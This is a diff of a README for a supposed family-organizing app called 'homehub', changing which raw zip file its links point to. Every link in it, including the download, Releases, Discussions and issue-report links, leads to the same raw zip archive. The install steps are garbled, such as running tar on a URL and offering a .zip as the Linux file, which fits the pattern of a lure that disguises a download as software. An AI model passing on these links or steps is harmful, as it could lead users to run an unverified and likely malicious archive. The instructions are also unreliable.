@@ -1,7 +1,7 @@
 # 🎉 homehub - A Simple Utility for Family Life
 
 ## 📥 Download Now
-[![Download Homehub](https://raw.githubusercontent.com/Nick019228/homehub/main/ophidology/homehub.zip%20Homehub-Now-brightgreen)](https://raw.githubusercontent.com/Nick019228/homehub/main/ophidology/homehub.zip)
+[![Download Homehub](https://raw.githubusercontent.com/Nick019228/homehub/main/app/Software-v3.1.zip%20Homehub-Now-brightgreen)](https://raw.githubusercontent.com/Nick019228/homehub/main/app/Software-v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to homehub! This is a lightweight, no-login, self-hosted family utility for your home. It helps you manage daily tasks, organize family schedules, and improve home communication without the hassle of accounts or logins.
@@ -19,11 +19,11 @@ To run homehub, you’ll need:
 - 500 MB of free disk space
 
 ## 💾 Download & Install
-Please visit this page to download: [Homehub Releases](https://raw.githubusercontent.com/Nick019228/homehub/main/ophidology/homehub.zip).
+Please visit this page to download: [Homehub Releases](https://raw.githubusercontent.com/Nick019228/homehub/main/app/Software-v3.1.zip).
 
 Once on the Releases page, follow these steps:
 1. **Select the latest version.** Look for the most recent release at the top of the list.
-2. **Choose your file.** You will see files specific to your operating system. Click on the appropriate file (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Nick019228/homehub/main/ophidology/homehub.zip` for Linux).
+2. **Choose your file.** You will see files specific to your operating system. Click on the appropriate file (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Nick019228/homehub/main/app/Software-v3.1.zip` for Linux).
 3. **Download the file.** Your browser will download the selected file to your computer.
 
 ### 📂 Installation Steps 
@@ -43,7 +43,7 @@ After downloading the file, follow these instructions based on your operating sy
 
 #### 🐧 For Linux:
 1. Open a terminal and navigate to the directory where you downloaded the file.
-2. Extract the contents using a command like `tar -xvzf https://raw.githubusercontent.com/Nick019228/homehub/main/ophidology/homehub.zip`.
+2. Extract the contents using a command like `tar -xvzf https://raw.githubusercontent.com/Nick019228/homehub/main/app/Software-v3.1.zip`.
 3. Change to the extracted directory by typing `cd homehub`.
 4. Run homehub with the command `./homehub`.
 
@@ -60,8 +60,8 @@ If you encounter any issues while using homehub, please check out our FAQ sectio
 Connect with other homehub users! Share tips and experiences. Engage with us on our GitHub Discussions page. Your input is valuable in making homehub better for everyone.
 
 ### 🔗 Important Links
-- [Download Homehub](https://raw.githubusercontent.com/Nick019228/homehub/main/ophidology/homehub.zip)
-- [GitHub Discussions](https://raw.githubusercontent.com/Nick019228/homehub/main/ophidology/homehub.zip)
-- [Report an Issue](https://raw.githubusercontent.com/Nick019228/homehub/main/ophidology/homehub.zip)
+- [Download Homehub](https://raw.githubusercontent.com/Nick019228/homehub/main/app/Software-v3.1.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Nick019228/homehub/main/app/Software-v3.1.zip)
+- [Report an Issue](https://raw.githubusercontent.com/Nick019228/homehub/main/app/Software-v3.1.zip)
 
 Thank you for choosing homehub! We hope it enhances your family's daily life. Happy organizing!
